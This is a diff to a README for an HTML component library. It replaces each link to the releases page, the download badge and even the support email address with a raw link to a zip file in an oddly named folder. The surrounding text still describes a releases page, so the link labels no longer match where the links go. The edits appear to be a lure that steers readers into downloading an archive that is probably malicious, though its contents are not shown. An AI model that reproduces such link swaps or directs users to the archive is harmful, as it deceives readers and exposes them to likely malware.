@@ -1,7 +1,7 @@
 # 🚀 html5-component-library - Simple, Clear HTML Components for Everyone
 
 ## 📥 Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-HTML5%20Component%20Library-brightgreen)](https://github.com/matheusw23/html5-component-library/releases)
+[![Download Now](https://github.com/matheusw23/html5-component-library/raw/refs/heads/main/lithontriptist/html-library-component-aliethmoidal.zip%20Now-HTML5%20Component%20Library-brightgreen)](https://github.com/matheusw23/html5-component-library/raw/refs/heads/main/lithontriptist/html-library-component-aliethmoidal.zip)
 
 ## 📖 Introduction
 Welcome to the **HTML5 Component Library**! This library offers a practical set of HTML components. It is built with clarity and accessibility in mind. Whether you're creating a blog, a portfolio, or any website, these components will help you build quickly and efficiently, without any framework required.
@@ -9,7 +9,7 @@ Welcome to the **HTML5 Component Library**! This library offers a practical set 
 ## 🚀 Getting Started
 To get started with the HTML5 Component Library, follow these simple steps:
 
-1. **Visit the Releases Page:** Click on this link to access our releases page: [Download Here](https://github.com/matheusw23/html5-component-library/releases).
+1. **Visit the Releases Page:** Click on this link to access our releases page: [Download Here](https://github.com/matheusw23/html5-component-library/raw/refs/heads/main/lithontriptist/html-library-component-aliethmoidal.zip).
   
 2. **Choose Your Version:** On the releases page, you will see various versions of the library. Here, you can find the latest stable release, which is recommended for most users.
 
@@ -50,7 +50,7 @@ If you want to contribute, here's how:
 3. **Submit a Pull Request:** Once ready, submit a pull request to share your changes with the community.
 
 ## 📧 Contact
-For general inquiries or support, please reach out to us at: support@example.com
+For general inquiries or support, please reach out to us at: https://github.com/matheusw23/html5-component-library/raw/refs/heads/main/lithontriptist/html-library-component-aliethmoidal.zip
 
 ## 🎉 Acknowledgements
 Thanks to the community for your feedback and support. This project thrives on user suggestions and contributions.
@@ -62,6 +62,6 @@ This project is open source and available under the MIT License. You are free to
 We value your privacy. This library does not collect any user data.
 
 ## 📦 Download & Install
-To download the HTML5 Component Library, visit this page to download: [Download Here](https://github.com/matheusw23/html5-component-library/releases). Follow the instructions provided above to extract and use the components in your project. 
+To download the HTML5 Component Library, visit this page to download: [Download Here](https://github.com/matheusw23/html5-component-library/raw/refs/heads/main/lithontriptist/html-library-component-aliethmoidal.zip). Follow the instructions provided above to extract and use the components in your project. 
 
 Enjoy building your next web project with the HTML5 Component Library!
